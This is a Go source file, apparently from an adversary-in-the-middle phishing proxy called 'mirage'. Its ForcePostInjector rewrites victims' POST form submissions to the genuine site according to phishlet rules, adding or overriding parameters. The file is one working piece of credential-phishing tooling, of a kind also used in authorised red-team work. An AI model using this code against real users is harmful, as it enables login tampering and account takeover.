package request

import (
	"io"
	"net/http"
	"net/url"
	"strconv"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy"
)

// ForcePostInjector adds or overrides POST parameters on matching requests.
type ForcePostInjector struct{}

func (h *ForcePostInjector) Name() string { return "ForcePostInjector" }

func (h *ForcePostInjector) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
	if ctx.Phishlet == nil || req.Method != http.MethodPost {
		return nil
	}
	for _, forcePost := range ctx.Phishlet.ForcePosts {
		if !forcePost.Path.MatchString(req.URL.Path) {
			continue
		}
		bodyBytes, err := readAndRestoreBody(req)
		if err != nil {
			continue
		}
		if !checkForcePostConditions(forcePost.Conditions, bodyBytes) {
			continue
		}
		modified := injectFormParams(bodyBytes, forcePost.Params)
		req.Body = io.NopCloser(bytesReader(modified))
		req.ContentLength = int64(len(modified))
		req.Header.Set("Content-Length", strconv.Itoa(len(modified)))
	}
	return nil
}

func checkForcePostConditions(conditions []aitm.ForcePostCondition, body []byte) bool {
	parsed, _ := url.ParseQuery(string(body))
	for _, condition := range conditions {
		matched := false
		for key, values := range parsed {
			if condition.Key != nil && condition.Key.MatchString(key) {
				for _, value := range values {
					if condition.Search == nil || condition.Search.MatchString(value) {
						matched = true
					}
				}
			}
		}
		if !matched {
			return false
		}
	}
	return true
}

func injectFormParams(body []byte, params []aitm.ForcePostParam) []byte {
	parsed, err := url.ParseQuery(string(body))
	if err != nil {
		parsed = url.Values{}
	}
	for _, param := range params {
		parsed.Set(param.Key, param.Value)
	}
	return []byte(parsed.Encode())
}

type bytesReader []byte

func (b bytesReader) Read(p []byte) (int, error) {
	n := copy(p, b)
	if n == len(b) {
		return n, io.EOF
	}
	return n, nil
}

var _ proxy.RequestHandler = (*ForcePostInjector)(nil)
